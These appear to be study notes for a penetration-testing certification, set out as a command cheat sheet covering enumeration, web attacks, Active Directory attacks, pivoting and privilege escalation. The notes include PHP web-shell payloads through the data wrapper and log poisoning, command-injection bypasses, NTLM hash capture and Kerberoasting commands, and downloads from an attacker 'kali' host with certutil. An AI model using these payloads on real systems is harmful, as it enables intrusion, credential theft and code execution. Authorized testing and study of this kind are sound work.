# CPTS Master Knowledge Base (Refined Memory)

This document is the ultimate synthesis of the CPTS_Notes repository, capturing the "DNA" of the Certified Penetration Testing Specialist curriculum. It integrates advanced bypasses, multi-stage attack chains, and professional methodologies.

---

## 1. Professional Penetration Testing Methodology
### 1.1 The "I'm Stuck" Loop
1.  **Re-enumerate:** Check for missed ports, sub-directories, or parameters.
2.  **Configuration Review:** Search for `wp-config.php`, `web.config`, `.env`, or hardcoded creds in `/etc/hosts`.
3.  **Local Services:** Identify services listening on `127.0.0.1` and pivot to them.
4.  **Fallback Vectors:** If `psexec` fails, try `wmiexec`. If `wget` fails, try `certutil` or `bitsadmin`.

### 1.2 Documentation Standards
- **Proofs:** Always include `whoami`, `hostname`, and `ipconfig/ifconfig` in every screenshot.
- **Reporting:** Focus on **Impact** (e.g., "Access to sensitive financial records") rather than just technical flaws.

---

## 2. Advanced Network Enumeration & Discovery
### 2.1 Passive Reconnaissance
- **Listen to the Wire:** Use `wireshark` or `tcpdump -i <iface>` to identify hosts via ARP and MDNS.
- **Responder (Analyze):** `sudo responder -I <iface> -A` to passively map the domain.

### 2.2 Active Discovery
- **FPing Sweep:** `fping -asgq 172.16.5.0/23` (Fast and scriptable).
- **Nmap Standard Full Scan:**
  `sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn $IP -oA scans/allports`

### 2.3 Service Footprinting
- **SMB:** `crackmapexec smb $IP --shares -u '' -p ''` (Null session check).
- **LDAP:** `windapsearch.py --dc-ip $IP -u user -p pass --da` (Enumerate Domain Admins).
- **SNMP:** `onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt $IP`.

---

## 3. Web Application Attack Vectors & Bypasses
### 3.1 Advanced Fuzzing (ffuf)
- **Parameter Discovery:** `ffuf -w params.txt:FUZZ -u 'http://target/index.php?FUZZ=val' -fs <size>`
- **Recursive LFI:** `ffuf -w LFI-Jhaddix.txt:FUZZ -u 'http://target/index.php?lang=FUZZ'`

### 3.2 LFI/RFI Bypasses
- **PHP Filter (Base64):** `php://filter/read=convert.base64-encode/resource=config`
- **RCE via Data Wrapper:** `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=id`
- **Log Poisoning:** Inject `<?php system($_GET['cmd']); ?>` into `User-Agent` and include `/var/log/apache2/access.log`.

### 3.3 Command Injection Bypasses
- **Space Filters:** Use `${IFS}` or `%09` (Tab).
- **Slash Filters:** Use `${PATH:0:1}`.
- **Blacklist Bypass:** `w'h'o'am'i` or `$(rev<<<'imaohw')`.

---

## 4. Active Directory Domain Dominance
### 4.1 Initial Foothold (No Credentials)
- **Responder Poisoning:** `sudo responder -I tun0 -dwv` (Capture NTLM hashes).
- **Kerbrute User Enumeration:** `kerbrute userenum -d domain.local --dc $IP users.txt`.
- **AS-REP Roasting:** `impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat`.

### 4.2 Credentialed Attacks
- **Kerberoasting:** `impacket-GetUserSPNs domain.local/user:pass -dc-ip $IP -request`.
- **BloodHound:** `bloodhound-python -u user -p pass -d domain.local -c All`.

### 4.3 Advanced ACL Attacks
- **Add to Group:** `Add-DomainGroupMember -Identity 'TargetGroup' -Members 'User' -Credential $Cred`.
- **Fake SPN Injection:** `Set-DomainObject -Identity targetuser -SET @{serviceprincipalname='fake/SPN'}` then Kerberoast.

---

## 5. Pivoting, Tunneling & Port Forwarding
### 5.1 SSH Tunneling
- **Dynamic (SOCKS):** `ssh -D 9050 user@pivot` (Configure `/etc/proxychains.conf`).
- **Reverse Port Forward:** `ssh -R 8080:localhost:80 user@kali`.

### 5.2 Modern Tools
- **Chisel:**
  - *Server:* `./chisel server -p 8000 --reverse`
  - *Client:* `./chisel client $KALI_IP:8000 R:socks`
- **Ligolo-ng:** Highly efficient TUN-based pivoting for entire network segments.

---

## 6. Privilege Escalation (PrivEsc)
### 6.1 Linux Essentials
- **Sudo Rights:** `sudo -l` (Check for `NOPASSWD`).
- **SUID Binaries:** `find / -perm -4000 2>/dev/null` (Cross-ref with GTFOBins).
- **Capabilities:** `getcap -r / 2>/dev/null`.
- **Sensitive Files:** Check `/etc/shadow` (if readable) or `.bash_history`.

### 6.2 Windows Essentials
- **Token Impersonation:** `whoami /priv` (Look for `SeImpersonatePrivilege`).
- **Registry Secrets:** `reg query HKLM /f password /t REG_SZ /s`.
- **Unquoted Service Paths:** Look for services starting from `C:\` without quotes.

---

## 7. Shell Stabilization & File Transfers
### 7.1 TTY Upgrade (Linux)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### 7.2 File Transfers
- **Windows:** `certutil -urlcache -split -f http://kali/file.exe file.exe` or `iwr -uri http://kali/file -OutFile file`.
- **Linux:** `wget` or `curl -O`.

---
*Last Refined: April 3, 2026 (Refinement Pass 20 - Final Synthesis)*
